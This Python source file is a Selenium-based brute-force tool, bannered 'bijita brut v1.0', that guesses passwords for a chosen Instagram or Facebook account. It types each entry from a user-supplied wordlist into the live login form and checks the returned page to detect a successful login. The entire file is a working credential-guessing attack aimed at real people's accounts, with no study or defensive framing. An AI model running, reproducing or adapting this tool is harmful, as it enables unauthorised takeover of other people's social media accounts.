from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
print("""
$$\       $$\     $$\   $$\                     $$\                             $$\     
$$ |      \__|    \__|  $$ |                    $$ |                            $$ |    
$$$$$$$\  $$\ $$\ $$\ $$$$$$\    $$$$$$\        $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$\   
$$  __$$\ $$ |\__|$$ |\_$$  _|   \____$$\       $$  __$$\ $$  __$$\ $$ |  $$ |\_$$  _|  
$$ |  $$ |$$ |$$\ $$ |  $$ |     $$$$$$$ |      $$ |  $$ |$$ |  \__|$$ |  $$ |  $$ |    
$$ |  $$ |$$ |$$ |$$ |  $$ |$$\ $$  __$$ |      $$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ 
$$$$$$$  |$$ |$$ |$$ |  \$$$$  |\$$$$$$$ |      $$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |
\_______/ \__|$$ |\__|   \____/  \_______|      \_______/ \__|       \______/    \____/ 
        $$\   $$ |                                                                      
        \$$$$$$  |                                                                      
         \______/            created by : bijita | v:1.0 """)
print("""1 : instagrame .
2 : facebook .""")
account_type = input("the acount : ")
if account_type == str(1) :
    username = input('Username: ')
if account_type == str(2) :
    username = input('email or id : ')
dictionary = input('Choose Dictionary: ')
print("wich mode you want to use :")
print(" 1 : all in the same tab ")
print(" 2 : evry password in tab")
mode = input("mode : ")
with open(f'{dictionary}.txt', 'r') as file:
        bruteforce = [line.strip() for line in file]
def mode1() :
    driver = webdriver.Chrome() 
    driver.get('https://www.instagram.com')
    time.sleep(3)
    for password in bruteforce:
        username_field = driver.find_element(By.NAME, 'username')
        username_field.send_keys(username)
        password_field = driver.find_element(By.NAME, 'password')
        password_field.send_keys(Keys.CONTROL + "a")
        password_field.send_keys(Keys.DELETE)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        time.sleep(3)
        html_code = driver.page_source
        erorr = "Sorry, your password was incorrect. Please double-check your password"
        
        if erorr in html_code:
            print(f"password [{password}] is incorect ! ")
        else :
            print(f'Successfully logged in with password: {password}')
            break
    driver.quit()    
def mode2() :
    for password in bruteforce:
        
        driver = webdriver.Chrome()  # Ensure you have the chromedriver executable in your PATH
        driver.get('https://www.instagram.com')
        username_field = driver.find_element(By.NAME, 'username')
        username_field.send_keys(username)
        password_field = driver.find_element(By.NAME, 'password')
        password_field.send_keys(Keys.CONTROL + "a")
        password_field.send_keys(Keys.DELETE)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        time.sleep(3)
        html_code = driver.page_source
        erorr = "Sorry, your password was incorrect. Please double-check your password"
        driver.quit()
        if erorr in html_code:
            print(f"password [{password}] is incorect ! ")
        else :
            print(f'Successfully logged in with password: {password}')
            break
def mode3() :
    driver = webdriver.Chrome() 
    driver.get('https://www.facebook.com')
    time.sleep(3)
    for password in bruteforce:
        username_field = driver.find_element(By.NAME, 'email')
        username_field.send_keys(username)
        password_field = driver.find_element(By.NAME, 'pass')
        password_field.send_keys(Keys.CONTROL + "a")
        password_field.send_keys(Keys.DELETE)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        time.sleep(3)
        html_code = driver.page_source
        erorr = 'x1lliihq x6ikm8r x10wlt62 x1n2onr6'
        
        if erorr in html_code:
            print(f'Successfully logged in with password: {password}') 
            break  
        else :
            print(f"password [{password}] is incorect ! ")
    driver.quit()    
def mode4() :
    for password in bruteforce:
        
        driver = webdriver.Chrome()  
        driver.get('https://www.facebook.com')
        username_field = driver.find_element(By.NAME, 'email')
        username_field.send_keys(username)
        password_field = driver.find_element(By.NAME, 'pass')
        password_field.send_keys(Keys.CONTROL + "a")
        password_field.send_keys(Keys.DELETE)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        time.sleep(3)
        html_code = driver.page_source
        erorr = 'x1lliihq x6ikm8r x10wlt62 x1n2onr6'
        
        if erorr in html_code:
            print(f'Successfully logged in with password: {password}') 
            break  
        else :
            print(f"password [{password}] is incorect ! ")

if account_type == str(1) :  
    if mode == str(1) :
        mode1()
    elif mode == str(2) :
        mode2()
    else :
        print("mode must be 1 or 2")
if account_type == str(2) :  
    if mode == str(1) :
        mode3()
    elif mode == str(2) :
        mode4()
    else :
        print("mode must be 1 or 2")
else :
    print("your choise must be 1 or 2")
#created by bijita v 1.0